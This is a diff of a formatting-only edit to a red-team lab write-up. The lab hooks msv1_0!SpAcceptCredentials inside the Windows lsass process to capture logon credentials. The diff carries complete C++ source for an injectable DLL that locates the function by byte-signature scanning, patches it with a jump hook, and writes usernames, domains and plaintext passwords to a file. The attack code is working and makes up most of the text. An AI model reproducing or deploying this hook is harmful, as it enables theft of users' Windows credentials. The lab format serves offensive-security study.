@@ -109,7 +109,7 @@ Considering that we know the following:
   * Domain name
   * DownLevelName - user name
 
-...we can now inspect the values and structures passed as shown below: 
+...we can now inspect the values and structures passed as shown below:
 
 ![PSECPKG\_PRIMARY\_CRED structure and SpAcceptCredentials prototype](../../.gitbook/assets/image%20%2853%29.png)
 
@@ -145,7 +145,7 @@ Additionally, below shows that the value contained in the register `r8` holds a 
 
 ![](../../.gitbook/assets/image%20%28283%29.png)
 
-## Signaturing `SpAcceptCredentials` 
+## Signaturing `SpAcceptCredentials`
 
 As mentioned earlier, the `SpAcceptCredentials`is not exported in the `msv1_0` DLL, so we cannot use Windows APIs to resolve its address in memory, therefore we need to find it ourselves by scanning the lsass process memory space.
 
@@ -192,7 +192,7 @@ Assuming we've compiled the DLL, let's inject it into lsass. I will simply injec
 
 ![](../../.gitbook/assets/msv1_0-spacceptcredentials-hooking.gif)
 
-Let's now have a quick look inside the lsass.exe via WinDBG when `msv1_0!SpAcceptCredentials` is called. 
+Let's now have a quick look inside the lsass.exe via WinDBG when `msv1_0!SpAcceptCredentials` is called.
 
 If we break into lsass, we will see that our module `memssp-dll.dll` is now loaded - line 23:
 
@@ -237,7 +237,7 @@ The first instructions of the hooked function now are:
 
 ![](../../.gitbook/assets/image%20%28249%29.png)
 
-These instructions came from the below code in our DLL. 
+These instructions came from the below code in our DLL.
 
 `mov rax` instruction, where rax is the address of our `hookedSpAccecptedCredentials`:
 
@@ -275,7 +275,7 @@ Below shows how user `spotless` on a machine `WS02` authenticates successfully a
 
 ![](../../.gitbook/assets/msv1_0-spacceptcredentials.gif)
 
-Note that msv1\_0 exports a function `LsaApLogonUserEx2` that we could have hooked to intercept credentials since it is also passed a structure `PSECPKG_PRIMARY_CRED` when a user  attempts to authenticate. This lab, however, was focused on the exercise of finding the required function address by scanning the target process memory rather than resolving it via Windows APIs:
+Note that msv1\_0 exports a function `LsaApLogonUserEx2` that we could have hooked to intercept credentials since it is also passed a structure `PSECPKG_PRIMARY_CRED` when a user attempts to authenticate. This lab, however, was focused on the exercise of finding the required function address by scanning the target process memory rather than resolving it via Windows APIs:
 
 ![](../../.gitbook/assets/lsaaplogonuserex2.gif)
 
@@ -286,7 +286,7 @@ It's possible to resolve the `SpAcceptCredentials` function address if we have a
 ```cpp
 HMODULE targetModule = LoadLibraryA("msv1_0.dll");
 PCSTR symbolName = "msv1_0!SpAcceptCredentials";
-ULONG64 buffer[(sizeof(SYMBOL_INFO) + MAX_SYM_NAME * sizeof(TCHAR) + sizeof(ULONG64) - 1) /	sizeof(ULONG64)] = {};
+ULONG64 buffer[(sizeof(SYMBOL_INFO) + MAX_SYM_NAME * sizeof(TCHAR) + sizeof(ULONG64) - 1) /    sizeof(ULONG64)] = {};
 PSYMBOL_INFO symbol = (PSYMBOL_INFO)buffer;
 symbol->SizeOfStruct = sizeof(SYMBOL_INFO);
 symbol->MaxNameLen = MAX_SYM_NAME;
@@ -319,105 +319,105 @@ void installSpAccecptedCredentialsHook();
 
 PVOID GetPatternMemoryAddress(char *startAddress, char *pattern, SIZE_T patternSize, SIZE_T searchBytes)
 {
-	unsigned int index = 0;
-	PVOID patternAddress = NULL;
-	char
-		*patternByte = 0,
-		*memoryByte = 0;
-	do
-	{
-		if (startAddress[index] == pattern[0])
-		{
-			for (size_t i = 1; i < patternSize; i++)
-			{
-				*(char *)&patternByte = pattern[i];
-				*(char *)&memoryByte = startAddress[index + i];
+    unsigned int index = 0;
+    PVOID patternAddress = NULL;
+    char
+        *patternByte = 0,
+        *memoryByte = 0;
+    do
+    {
+        if (startAddress[index] == pattern[0])
+        {
+            for (size_t i = 1; i < patternSize; i++)
+            {
+                *(char *)&patternByte = pattern[i];
+                *(char *)&memoryByte = startAddress[index + i];
 
-				if (patternByte != memoryByte)
-				{
-					break;
-				}
+                if (patternByte != memoryByte)
+                {
+                    break;
+                }
 
-				if (i == patternSize - 1)
-				{
-					patternAddress = (LPVOID)(&startAddress[index]);
-					return patternAddress;
-				}
-			}
-		}
-		++index;
-	} while (index < searchBytes);
+                if (i == patternSize - 1)
+                {
+                    patternAddress = (LPVOID)(&startAddress[index]);
+                    return patternAddress;
+                }
+            }
+        }
+        ++index;
+    } while (index < searchBytes);
 
-	return (PVOID)NULL;
+    return (PVOID)NULL;
 }
 
 NTSTATUS NTAPI hookedSpAccecptedCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
 {
-	DWORD bytesWritten = 0;
-	HANDLE file = CreateFileW(L"c:\\temp\\credentials.txt", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, NULL, NULL);
-	_SpAcceptCredentials originalSpAcceptCredentials = (_SpAcceptCredentials)addressOfSpAcceptCredentials;
+    DWORD bytesWritten = 0;
+    HANDLE file = CreateFileW(L"c:\\temp\\credentials.txt", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, NULL, NULL);
+    _SpAcceptCredentials originalSpAcceptCredentials = (_SpAcceptCredentials)addressOfSpAcceptCredentials;
 
-	// intercept credentials and write them to disk
-	WriteFile(file, PrimaryCredentials->DownlevelName.Buffer, PrimaryCredentials->DownlevelName.Length, &bytesWritten, NULL);
-	WriteFile(file, "@", 2, &bytesWritten, NULL);
-	WriteFile(file, PrimaryCredentials->DomainName.Buffer, PrimaryCredentials->DomainName.Length, &bytesWritten, NULL);
-	WriteFile(file, ":", 2, &bytesWritten, NULL);
-	WriteFile(file, PrimaryCredentials->Password.Buffer, PrimaryCredentials->Password.Length, &bytesWritten, NULL);
-	CloseHandle(file);
+    // intercept credentials and write them to disk
+    WriteFile(file, PrimaryCredentials->DownlevelName.Buffer, PrimaryCredentials->DownlevelName.Length, &bytesWritten, NULL);
+    WriteFile(file, "@", 2, &bytesWritten, NULL);
+    WriteFile(file, PrimaryCredentials->DomainName.Buffer, PrimaryCredentials->DomainName.Length, &bytesWritten, NULL);
+    WriteFile(file, ":", 2, &bytesWritten, NULL);
+    WriteFile(file, PrimaryCredentials->Password.Buffer, PrimaryCredentials->Password.Length, &bytesWritten, NULL);
+    CloseHandle(file);
 
-	// unhook msv1_0!SpAcceptCredentials
-	WriteProcessMemory(GetCurrentProcess(), addressOfSpAcceptCredentials, bytesToRestoreSpAccecptedCredentials, sizeof(bytesToRestoreSpAccecptedCredentials), NULL);
+    // unhook msv1_0!SpAcceptCredentials
+    WriteProcessMemory(GetCurrentProcess(), addressOfSpAcceptCredentials, bytesToRestoreSpAccecptedCredentials, sizeof(bytesToRestoreSpAccecptedCredentials), NULL);
 
-	// hook msv1_0!SpAcceptCredentials again with a delay so that originalSpAcceptCredentials() can execute
-	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)installSpAccecptedCredentialsHook, NULL, NULL, NULL);
-	
-	// call original msv1_0!SpAcceptCredentials
-	return originalSpAcceptCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
+    // hook msv1_0!SpAcceptCredentials again with a delay so that originalSpAcceptCredentials() can execute
+    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)installSpAccecptedCredentialsHook, NULL, NULL, NULL);
+
+    // call original msv1_0!SpAcceptCredentials
+    return originalSpAcceptCredentials(LogonType, AccountName, PrimaryCredentials, SupplementalCredentials);
 }
 
 void installSpAccecptedCredentialsHook()
 {
-	Sleep(1000 * 5);
-	HMODULE targetModule = LoadLibraryA("msv1_0.dll");
-	DWORD bytesWritten = 0;
+    Sleep(1000 * 5);
+    HMODULE targetModule = LoadLibraryA("msv1_0.dll");
+    DWORD bytesWritten = 0;
 
-	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetModule;
-	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetModule + dosHeader->e_lfanew);
-	SIZE_T sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetModule;
+    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetModule + dosHeader->e_lfanew);
+    SIZE_T sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
 
-	// find address of msv1_0!SpAcceptCredentials
-	patternStartAddressOfSpAccecptedCredentials = (LPVOID)(DWORD_PTR)GetPatternMemoryAddress((char *)targetModule, startOfPatternSpAccecptedCredentials, sizeof(startOfPatternSpAccecptedCredentials), sizeOfImage);
-	addressOfSpAcceptCredentials = (LPVOID)((DWORD_PTR)patternStartAddressOfSpAccecptedCredentials - 16);
+    // find address of msv1_0!SpAcceptCredentials
+    patternStartAddressOfSpAccecptedCredentials = (LPVOID)(DWORD_PTR)GetPatternMemoryAddress((char *)targetModule, startOfPatternSpAccecptedCredentials, sizeof(startOfPatternSpAccecptedCredentials), sizeOfImage);
+    addressOfSpAcceptCredentials = (LPVOID)((DWORD_PTR)patternStartAddressOfSpAccecptedCredentials - 16);
 
-	// store first sizeof(bytesToRestoreSpAccecptedCredentials) bytes of the original msv1_0!SpAcceptCredentials routine
-	std::memcpy(bytesToRestoreSpAccecptedCredentials, addressOfSpAcceptCredentials, sizeof(bytesToRestoreSpAccecptedCredentials));
-	
-	// hook msv1_0!SpAcceptCredentials with "mov rax, hookedSpAccecptedCredentials; jmp rax";
-	DWORD_PTR addressBytesOfhookedSpAccecptedCredentials = (DWORD_PTR)&hookedSpAccecptedCredentials;
-	std::memcpy(bytesToPatchSpAccecptedCredentials + 2, &addressBytesOfhookedSpAccecptedCredentials, sizeof(&addressBytesOfhookedSpAccecptedCredentials));
-	std::memcpy(bytesToPatchSpAccecptedCredentials + 2 + sizeof(&addressBytesOfhookedSpAccecptedCredentials), (PVOID)&"\xff\xe0", 2);
-	WriteProcessMemory(GetCurrentProcess(), addressOfSpAcceptCredentials, bytesToPatchSpAccecptedCredentials, sizeof(bytesToPatchSpAccecptedCredentials), (SIZE_T*)&bytesWritten);
+    // store first sizeof(bytesToRestoreSpAccecptedCredentials) bytes of the original msv1_0!SpAcceptCredentials routine
+    std::memcpy(bytesToRestoreSpAccecptedCredentials, addressOfSpAcceptCredentials, sizeof(bytesToRestoreSpAccecptedCredentials));
+
+    // hook msv1_0!SpAcceptCredentials with "mov rax, hookedSpAccecptedCredentials; jmp rax";
+    DWORD_PTR addressBytesOfhookedSpAccecptedCredentials = (DWORD_PTR)&hookedSpAccecptedCredentials;
+    std::memcpy(bytesToPatchSpAccecptedCredentials + 2, &addressBytesOfhookedSpAccecptedCredentials, sizeof(&addressBytesOfhookedSpAccecptedCredentials));
+    std::memcpy(bytesToPatchSpAccecptedCredentials + 2 + sizeof(&addressBytesOfhookedSpAccecptedCredentials), (PVOID)&"\xff\xe0", 2);
+    WriteProcessMemory(GetCurrentProcess(), addressOfSpAcceptCredentials, bytesToPatchSpAccecptedCredentials, sizeof(bytesToPatchSpAccecptedCredentials), (SIZE_T*)&bytesWritten);
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 {
-	switch (ul_reason_for_call)
-	{
-		case DLL_PROCESS_ATTACH:
-		{
-			installSpAccecptedCredentialsHook();
-		}
-		case DLL_THREAD_ATTACH:
-		case DLL_THREAD_DETACH:
-		case DLL_PROCESS_DETACH:
-			break;
-	}
-	return TRUE;
+    switch (ul_reason_for_call)
+    {
+        case DLL_PROCESS_ATTACH:
+        {
+            installSpAccecptedCredentialsHook();
+        }
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+            break;
+    }
+    return TRUE;
 }
 ```
 {% endcode %}
 
 ## References
 
-{% embed url="https://blog.xpnsec.com/exploring-mimikatz-part-2/" %}
+{% embed url="https://blog.xpnsec.com/exploring-mimikatz-part-2/" caption="" %}
 
